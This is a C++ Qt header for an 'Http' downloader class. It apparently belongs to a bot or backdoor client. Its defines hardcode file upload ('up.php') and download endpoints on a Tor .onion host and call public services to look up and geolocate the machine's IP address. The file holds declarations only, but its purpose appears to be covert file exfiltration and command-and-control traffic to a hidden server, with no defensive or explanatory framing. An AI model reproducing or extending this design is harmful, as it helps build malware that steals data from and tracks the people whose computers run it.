#ifndef DOWNLOADER_H
#define DOWNLOADER_H

#include <QObject>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QNetworkProxy>
#include <QString>
#include <QUrl>
#include <QDateTime>
#include <QFile>
#include <QDebug>
#include <QJsonDocument>
#include <QJsonObject>
#include <QThread>
#include "client.h"

//#define URL_IP "http://ipecho.net/plain"
#define URL_IP "http://bot.whatismyipaddress.com"
#define URL_UPLOAD "https://rchlie7hgfhecoi7.onion/up.php"
//#define URL_UPLOAD "https://192.168.158.1/up.php"
#define URL_DOWNLOAD "https://rchlie7hgfhecoi7.onion"
//#define URL_DOWNLOAD "https://192.168.158.1"
#define URL_INFO "http://api.ipaddresslabs.com/iplocation/v1.7/locateip?key=demo&format=json&ip="
#define IP_RAW 1
#define IP_INFO 2
#define DOWNLOAD 3
#define UPLOAD 4

class Http : public QObject
{
    Q_OBJECT
public:
    explicit Http(int, QString _url = "", QString _filename = "", QString _dst = "", QObject *parent = 0);

signals:
    void finished(QString);
    void finished();

public slots:
    void downloadFile();
    void uploadFile();
    void sendInfo();
    void getInfo(QString);
    void finish(QString);
    void finish();
    void replyFinished (QNetworkReply *);

private:
   QNetworkAccessManager *manager;
   QNetworkProxy proxy;
   QString ip;
   QString url;
   QString filename;
   QString dst;
   int cmd;
};

#endif // DOWNLOADER_H
